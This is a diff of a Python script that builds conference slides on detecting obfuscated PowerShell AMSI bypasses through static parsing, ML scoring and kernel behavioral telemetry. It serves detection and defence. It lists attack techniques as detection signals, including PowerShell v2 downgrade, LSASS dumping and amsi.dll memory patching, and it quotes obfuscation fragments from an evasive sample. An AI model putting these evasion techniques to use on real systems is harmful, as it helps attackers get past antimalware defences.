-
-# Bottom: output
-rect(s, 0.3, 7.0, 12.7, 0.38, ACCENT_RED)
-txbox(s, "Output: confidence score per model  →  agregacja do jednego verdict (ramsi-rs)",
-      0.3, 7.0, 12.7, 0.38, size=12, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-
-
-# ── Slide V.4 – Layer 2: Behavioral / Telemetria ─────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "V", "Layer 2 — Behavioral / Telemetria", "")
-
-CLR_L2 = RGBColor(0x1A,0x7A,0xAA)
-
-# Intro
-rect(s, 0.3, 1.3, 12.7, 0.6, BG_CARD)
-rect(s, 0.3, 1.3, 0.07, 0.6, CLR_L2)
-txbox(s,
-      "Nie analizujemy kodu — obserwujemy co system robi. "
-      "Źródła: ETW providers, Sysmon, Windows Event Log.",
-      0.5, 1.35, 12.2, 0.5, size=14, color=TEXT_WHITE)
-
-# Signal cards — 2 rows x 3 cols
-signals = [
-    ("Odczyt HKLM\\AMSI\\Providers",
-     "Skrypt enumeruje providerów\nprzed bypasem — jak w\nAmsiProviderScanDisruption",
-     ACCENT_RED),
-    ("PowerShell -version 2",
-     "Downgrade do PSv2 omija\nAMSI i Script Block Logging\n— silny sygnał",
-     ACCENT_RED),
-    ("Podejrzane process tree",
-     "winword.exe → powershell.exe\nexplorer.exe → wscript.exe\nmshta.exe → cmd.exe",
-     RGBColor(0xC0,0x50,0x10)),
-    ("Network z script hosta",
-     "powershell.exe / wscript.exe\nnawiązuje połączenie HTTP/S\n— potencjalny C2 download",
-     RGBColor(0xC0,0x50,0x10)),
-    ("LSASS access",
-     "OpenProcess(LSASS) lub\nMiniDumpWriteDump —\ncredential harvesting",
-     RGBColor(0x1A,0x7A,0x3C)),
-    ("VirtualProtect na amsi.dll",
-     "Zmiana ochrony pamięci\nw obszarze amsi.dll —\npatch bypass signal",
-     RGBColor(0x1A,0x7A,0x3C)),
-]
-for i, (title, body, clr) in enumerate(signals):
-    col, row = i % 3, i // 3
-    x = 0.3 + col * 4.35
-    y = 2.15 + row * 2.35
-    rect(s, x, y, 4.1, 2.15, BG_CARD)
-    rect(s, x, y, 4.1, 0.07, clr)
-    txbox(s, title, x+0.1, y+0.1, 3.9, 0.42, size=13, bold=True, color=clr)
-    txbox(s, body,  x+0.1, y+0.58, 3.9, 1.45, size=12, color=TEXT_WHITE)
-
-# Bottom ETW note
-rect(s, 0.3, 6.85, 12.7, 0.53, BG_DARK)
-txbox(s,
-      "ETW providers: Microsoft-Windows-PowerShell (4104)  ·  "
-      "Microsoft-Antimalware-Scan-Interface  ·  "
-      "Microsoft-Windows-Threat-Intelligence  ·  Sysmon EventID 1/7/10",
-      0.5, 6.88, 12.2, 0.45, size=11, color=TEXT_GREY, align=PP_ALIGN.CENTER)
-
-
-# ── Slide 7: V – ramsi-rs + IoCs ─────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-rect(s, 0, 0, 13.33, 0.85, BG_CARD)
-txbox(s, "  Narzędzia detekcji  &  Wskaźniki zagrożenia (IoCs)", 0, 0, 13, 0.85,
-      size=22, bold=True, color=TEXT_WHITE)
-
-# ramsi-rs card
-rect(s, 0.3, 1.0, 5.8, 5.4, BG_CARD)
-txbox(s, "ramsi-rs", 0.5, 1.08, 5.4, 0.42, size=20, bold=True, color=ACCENT_ORG)
-txbox(s, "github.com/radkum/ramsi-rs", 0.5, 1.52, 5.4, 0.3, size=12, color=TEXT_GREY)
-feats = [
-    "Rule-based signatures znanych bypass",
-    "Heurystyczny ML scoring (unknown obfuscation)",
-    "Integracja z endpoint telemetry",
-    "Low-resource (native Rust — działa na agentach)",
-    "Actionable alerts z confidence scores",
-    "Feature vectors → SIEM / downstream ML",
-]
-tf = s.shapes.add_textbox(Inches(0.5), Inches(1.92), Inches(5.4), Inches(4.3))
-tf.word_wrap = True
-for i, f in enumerate(feats):
-    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-    p.space_before = Pt(5)
-    run = p.add_run()
-    run.text = f"▸  {f}"
-    run.font.size = Pt(14)
-    run.font.color.rgb = TEXT_WHITE
-
-# IoC cards
-ioc_groups = [
-    ("Reflection indicators", [
-        "System.Reflection.Assembly.Load()",
-        "MethodInfo / GetField() / Invoke()",
-    ]),
-    ("Obfuscation indicators", [
-        "Base64 w plain tekście",
-        "Excessive string concatenation",
-        "Multiple encoding layers",
-    ]),
-    ("AMSI-specific", [
-        "UnmanagedCode permissions",
-        "kernel32.dll imports",
-        "Memory tampering patterns",
-    ]),
-]
-for i, (title, items) in enumerate(ioc_groups):
-    y = 1.0 + i * 1.85
-    add_card(s, 6.5, y, 6.5, 1.7, title, items)
-
-
-# ── Slide 8: VI – Demo ───────────────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "VI", "Live Demo  –  Hybrid Detection Pipeline", "5 minut")
-
-steps = [
-    ("1", "Obfuscated sample",        "Załadowanie celowo obfuscowanego skryptu PowerShell"),
-    ("2", "ps-parser analysis",       "Rozwinięcie obfuscacji → czysty AST + feature extraction"),
-    ("3", "ramsi-rs detection",       "Rule-based check + ML scoring → confidence score"),
-    ("4", "Alert & verdict",          "Actionable alert z wyjaśnieniem dlaczego flagged"),
-]
-for i, (num, title, desc) in enumerate(steps):
-    x = 0.4 + i * 3.2
-    rect(s, x, 1.5, 2.8, 3.5, BG_CARD)
-    rect(s, x, 1.5, 2.8, 0.65, ACCENT_RED)
-    txbox(s, num, x, 1.5, 2.8, 0.65, size=28, bold=True,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    txbox(s, title, x+0.1, 2.25, 2.6, 0.45, size=14, bold=True, color=ACCENT_ORG)
-    txbox(s, desc,  x+0.1, 2.75, 2.6, 2.1,  size=13, color=TEXT_WHITE)
-    if i < 3:
-        txbox(s, "→", x+2.8, 2.85, 0.4, 0.5, size=20, color=ACCENT_ORG)
-
-txbox(s, "Środowisko: sandboxowana VM  ·  Sample przygotowany wcześniej  ·  Backup slides dostępne",
-      0.4, 5.3, 12.5, 0.4, size=13, color=TEXT_GREY, align=PP_ALIGN.CENTER)
-
-
-# ── Slide 9: VII – Summary ───────────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "VII", "Podsumowanie", "3 minut")
-
-takeaways = [
-    ("AMSI to niezbędna warstwa...",     "...ale nie jedyna. Bez dodatkowych warstw daje się ominąć."),
-    ("Obfuscacja jest łatwa...",          "...ale detekowalna przy poprawnym podejściu statycznym + ML."),
-    ("Obrona musi być wielowarstwowa",    "Static → Behavioral → Telemetry → Hybrid ML."),
-    ("Hybrid ML = przyszłość detekcji",   "Rule + ML = lepsze wyniki bez black-box gotchas."),
-]
-for i, (h, d) in enumerate(takeaways):
-    y = 1.4 + i * 1.35
-    rect(s, 0.3, y, 0.08, 0.9, ACCENT_RED)
-    txbox(s, h, 0.6, y,      12.3, 0.45, size=16, bold=True, color=TEXT_WHITE)
-    txbox(s, d, 0.6, y+0.45, 12.3, 0.55, size=14, color=TEXT_GREY)
-
-rect(s, 0, 6.3, 13.33, 1.2, ACCENT_RED)
-txbox(s, "Q&A", 0, 6.3, 13.33, 1.2, size=34, bold=True,
+rect(s, 0, 2.5, 13.33, 2.5, ACCENT_ORG)
+txbox(s, "LIVE DEMO", 0, 2.7, 13.33, 0.95, size=58, bold=True,
       color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+txbox(s, "5 actów — od literalnego bypass'a po behavioral catch",
+      0, 3.7, 13.33, 0.6, size=22, color=TEXT_WHITE,
+      align=PP_ALIGN.CENTER, italic=True)
+txbox(s, "Act 1: Layer 1 blocks an obfuscated bypass",   0, 5.3, 13.33, 0.4,
+      size=15, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+txbox(s, "Act 2: Detection rate sweep — 27/28 = 96 %",   0, 5.7, 13.33, 0.4,
+      size=15, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+txbox(s, "Act 3: Literal radkum technique caught live",  0, 6.1, 13.33, 0.4,
+      size=15, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+txbox(s, "Act 4: Evasive variant — only Suspicious",     0, 6.5, 13.33, 0.4,
+      size=15, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+txbox(s, "Act 5: Behavioral catches the residual",       0, 6.9, 13.33, 0.4,
+      size=15, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 14 — Act 1: obfuscated source                                       ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.1", "Act 1  —  Obfuscated AMSI bypass (sample 14)")
+txbox(s, "Cały skompilowany .NET DLL zakodowany w base64, ładowany przez Reflection.Assembly::Load.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "1_obfuscated_sample.png", 1.5, 1.7, 10.3, 4.8)
+footer(s, "samples\\malicious\\14_amsi_buffer_path.ps1  —  first 8 lines.   "
+          "Line 3 = entire AmsiBypass.dll as base64.")
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 15 — Act 1 catch                                                    ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.1b", "Act 1  —  ps-parser-cli verdict")
+txbox(s, "Rekurencyjny base64 deobfuscator wyciąga literały z UTF-16LE #US section.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "2_pscli_sample14_detection.png", 2.5, 1.7, 8.0, 4.5)
+
+rect(s, 0.8, 6.3, 11.7, 0.75, BG_CARD, ACCENT_GRN, 2)
+txbox(s, "status = AMSI BYPASS    •    confidence = 100    •    indicators: "
+         "AmsiDll, MemoryPatch, VtableManipulation, TelemetryFunction",
+      0.9, 6.4, 11.5, 0.55, size=13, bold=True, color=ACCENT_GRN, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 16 — Act 2: corpus sweep                                            ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.2", "Act 2  —  Detection rate sweep")
+txbox(s, "Tym samym silnikiem na pełnym zestawie 28 obfuskowanych sample'ów.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "3_pscli_full_corpus.png", 0.8, 1.7, 11.7, 5.0)
+
+rect(s, 0.8, 6.85, 11.7, 0.45, BG_CARD)
+txbox(s, "27 × AMSI BYPASS    •    1 × Suspicious  (sample 27 — patrz Akt 4)    •    0 × Clean",
+      0.9, 6.9, 11.5, 0.35, size=13, bold=True, color=ACCENT_GRN, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 17 — Act 3 source                                                   ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.3", "Act 3  —  Literal radkum technique (sample 26)")
+txbox(s, "Adaptacja github.com/radkum/AmsiProviderScanDisruption — bez obfuskacji.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "4_sample26_source.png", 1.5, 1.7, 10.3, 4.7)
+footer(s, "Literalne DllGetClassObject, Marshal.WriteIntPtr, AllocHGlobal — wszystko na wierzchu.")
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 18 — Act 3 live block                                               ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.3b", "Act 3  —  Live block in PowerShell")
+txbox(s, "Provider zwraca AMSI_RESULT_DETECTED. PS odmawia wykonania.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "5_amsi_red_error.png", 1.5, 1.7, 10.3, 4.6)
+
+rect(s, 0.8, 6.4, 11.7, 0.7, BG_CARD, ACCENT_RED, 2)
+txbox(s, "Standardowy AMSI block message — nie nasza nakładka.  "
+         "Skrypt sprzed 5 lat → blokowany dziś przez własny detector autora.",
+      0.9, 6.5, 11.5, 0.5, size=12, italic=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 19 — Act 4 source (sample 27)                                       ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.4", "Act 4  —  Evasive variant (sample 27)")
+txbox(s, "To samo zachowanie co sample 26 — każdy identyfikator zrekonstruowany w runtime.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "6_sample27_source.png", 1.0, 1.7, 11.3, 4.4)
+
+bullet(s, [
+    "Type name z char-code compare:  [int][char]$k[0] -eq 65   (= 'A')",
+    "Method name z base64:  'RGxsR2V0Q2xhc3NPYmplY3Q='  →  DllGetClassObject",
+    "Attribute name z konkatenacji:  'Unmanaged' + 'FunctionPointer'",
+], 0.8, 6.2, 12, line_h=0.35, size=12)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 20 — Act 4 PUNCH: ps-parser-cli Suspicious                          ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.4b", "Act 4  —  ⭐ PUNCH  ⭐  ps-parser-cli says 'Suspicious'")
+txbox(s, "Best static engine recovers DllGetClassObject from base64. But cannot reach BYPASS verdict.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "7_pscli_sample27_suspicious.png", 3.0, 1.7, 7.3, 4.6)
+
+rect(s, 0.8, 6.4, 11.7, 0.75, BG_CARD, ACCENT_ORG, 2)
+txbox(s, "status = Suspicious    •    confidence = 24    •    is_amsi_bypass = false    •    "
+         "indicators: ComManipulation × 2",
+      0.9, 6.5, 11.5, 0.55, size=13, bold=True, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 21 — Act 4c: Layer 1 doesn't block                                  ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.4c", "Act 4  —  Suspicious is NOT a block")
+txbox(s, "Provider returns CLEAN to AMSI (is_amsi_bypass=false). PowerShell executes the script.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "7_pscli_sample27_not_blocked.png", 1.5, 1.7, 10.3, 4.5)
+
+rect(s, 0.8, 6.3, 11.7, 0.85, BG_CARD, ACCENT_RED, 2)
+txbox(s, "To jest pułap statyki w działaniu.  Silnik widzi pęknięcie, nie ma dowodu na bypass.",
+      0.9, 6.4, 11.5, 0.35, size=13, bold=True, color=ACCENT_RED, align=PP_ALIGN.CENTER)
+txbox(s, "Behavioral observation closes the gap.",
+      0.9, 6.75, 11.5, 0.35, size=13, italic=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 22 — Act 5: Layer 2 catches                                         ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "V.5", "Act 5  —  Layer 2 (kernel) catches the recon")
+txbox(s, "Każdy OpenSubKey z \\AMSI\\ w ścieżce  →  event AMSI-RECON w sysmon-um.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_ORG, italic=True)
+screen(s, "8_sample27_layer2_caught.png", 1.0, 1.7, 11.3, 4.7)
+
+rect(s, 0.8, 6.55, 11.7, 0.55, BG_CARD, ACCENT_GRN, 2)
+txbox(s, "Żadna legitymna aplikacja nie czyta tych kluczy.  Decyzja w 10 ms.  Definitywna.",
+      0.9, 6.65, 11.5, 0.4, size=13, bold=True, color=ACCENT_GRN, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 23 — Summary: the gradient                                          ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "VI", "Summary — detection gradient on sample 27")
+
+# Three columns, but middle column is the punch
+col_y = 1.5
+col_h = 5.0
+col_w = 4.0
+gap = 0.3
+
+# Left: AST-only parsers (na potrzeby narracji "AST-only parser" - hypothetical)
+rect(s, 0.5, col_y, col_w, col_h, BG_CARD, TEXT_DIM, 2)
+txbox(s, "Naive static parser", 0.7, col_y + 0.2, col_w - 0.4, 0.4,
+      size=15, bold=True, color=TEXT_DIM)
+txbox(s, "AST + literal-string match", 0.7, col_y + 0.65, col_w - 0.4, 0.3,
+      size=11, color=TEXT_DIM, italic=True)
+bullet(s, [
+    "Widzi: literal AMSI",
+    "Widzi: literal AmsiUtils",
+    "Widzi: amsiInitFailed",
+], 0.7, col_y + 1.2, col_w - 0.4, line_h=0.45, size=12, color=TEXT_GREY)
+rect(s, 0.7, col_y + col_h - 1.1, col_w - 0.4, 0.85, BG_DARK, TEXT_DIM, 1)
+txbox(s, "Clean", 0.7, col_y + col_h - 1.05, col_w - 0.4, 0.5,
+      size=24, bold=True, color=TEXT_DIM, align=PP_ALIGN.CENTER)
+txbox(s, "no signal", 0.7, col_y + col_h - 0.55, col_w - 0.4, 0.3,
+      size=10, italic=True, color=TEXT_DIM, align=PP_ALIGN.CENTER)
+
+# Middle: ps-parser-cli
+rect(s, 0.5 + col_w + gap, col_y, col_w, col_h, BG_CARD, ACCENT_ORG, 2)
+txbox(s, "ps-parser-cli", 0.7 + col_w + gap, col_y + 0.2, col_w - 0.4, 0.4,
+      size=15, bold=True, color=ACCENT_ORG)
+txbox(s, "Rust + recursive base64 + 30 predykatów", 0.7 + col_w + gap, col_y + 0.65, col_w - 0.4, 0.3,
+      size=11, color=ACCENT_ORG, italic=True)
+bullet(s, [
+    "Wyciąga DllGetClassObject z b64",
+    "Łapie ComManipulation",
+    "Sygnał — ale bez literalnego",
+    "AMSI w żadnej formie",
+], 0.7 + col_w + gap, col_y + 1.2, col_w - 0.4, line_h=0.45, size=12)
+rect(s, 0.7 + col_w + gap, col_y + col_h - 1.1, col_w - 0.4, 0.85, BG_DARK, ACCENT_ORG, 1)
+txbox(s, "Suspicious", 0.7 + col_w + gap, col_y + col_h - 1.05, col_w - 0.4, 0.5,
+      size=22, bold=True, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+txbox(s, "widzi pęknięcie — ale nie dowód", 0.7 + col_w + gap, col_y + col_h - 0.55, col_w - 0.4, 0.3,
+      size=10, italic=True, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+
+# Right: Layer 2
+rect(s, 0.5 + 2 * (col_w + gap), col_y, col_w, col_h, BG_CARD, ACCENT_GRN, 2)
+txbox(s, "Layer 2 (kernel)", 0.7 + 2 * (col_w + gap), col_y + 0.2, col_w - 0.4, 0.4,
+      size=15, bold=True, color=ACCENT_GRN)
+txbox(s, "Behavioral — runtime observation", 0.7 + 2 * (col_w + gap), col_y + 0.65, col_w - 0.4, 0.3,
+      size=11, color=ACCENT_GRN, italic=True)
+bullet(s, [
+    "Process otwiera \\AMSI\\ key",
+    "Niezależne od literałów",
+    "Niezależne od obfuskacji",
+    "Widzi realny dostęp",
+], 0.7 + 2 * (col_w + gap), col_y + 1.2, col_w - 0.4, line_h=0.45, size=12)
+rect(s, 0.7 + 2 * (col_w + gap), col_y + col_h - 1.1, col_w - 0.4, 0.85, BG_DARK, ACCENT_GRN, 1)
+txbox(s, "AMSI BYPASS", 0.7 + 2 * (col_w + gap), col_y + col_h - 1.05, col_w - 0.4, 0.5,
+      size=20, bold=True, color=ACCENT_GRN, align=PP_ALIGN.CENTER)
+txbox(s, "definitive, 10 ms", 0.7 + 2 * (col_w + gap), col_y + col_h - 0.55, col_w - 0.4, 0.3,
+      size=10, italic=True, color=ACCENT_GRN, align=PP_ALIGN.CENTER)
+
+txbox(s,
+      "Statyka ma fundamentalny pułap.  Każda warstwa ma swoje miejsce.\n"
+      "Defense in depth nie jest opcjonalne — jest konieczne.",
+      0.5, 6.65, 12.3, 0.7, size=14, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 24 — Q&A / References                                               ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+rect(s, 0, 1.2, 13.33, 1.5, ACCENT_RED)
+txbox(s, "Q & A", 0, 1.35, 13.33, 1.2, size=72, bold=True,
+      color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+
+txbox(s, "Resources", 0.8, 3.3, 12, 0.5, size=22, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "ps-parser   —  crates.io/crates/ps-parser     (Rust PowerShell evaluator)",
+    "AmsiProviderScanDisruption   —  github.com/radkum/AmsiProviderScanDisruption",
+    "windows-kernel-rs   —  github.com/radkum/windows-kernel-rs",
+    "AMSI documentation   —  learn.microsoft.com/en-us/windows/win32/amsi/",
+    "Confidence   —  this project, full source available on request",
+], 1.0, 3.9, 11.5, line_h=0.5, size=14)
+
+txbox(s, "Radosław Kumorek   •   Kaseya   •   radoslaw.kumorek@kaseya.com",
+      0, 6.8, 13.33, 0.4, size=13, color=TEXT_GREY, align=PP_ALIGN.CENTER)
 
 
 # ── Save ─────────────────────────────────────────────────────────────────────
-out = r"C:\VSExclude\confidence_2026\AMSI_vs_Obfuscation.pptx"
-prs.save(out)
+out = Path("AMSI_vs_Obfuscation.pptx")
+# Backup existing
+if out.exists():
+    bak = out.with_suffix(".pptx.bak_pre_pscli")
+    if not bak.exists():
+        bak.write_bytes(out.read_bytes())
+        print(f"backup -> {bak}")
+prs.save(str(out))
 print(f"Saved: {out}")
 print(f"Slides: {len(prs.slides)}")
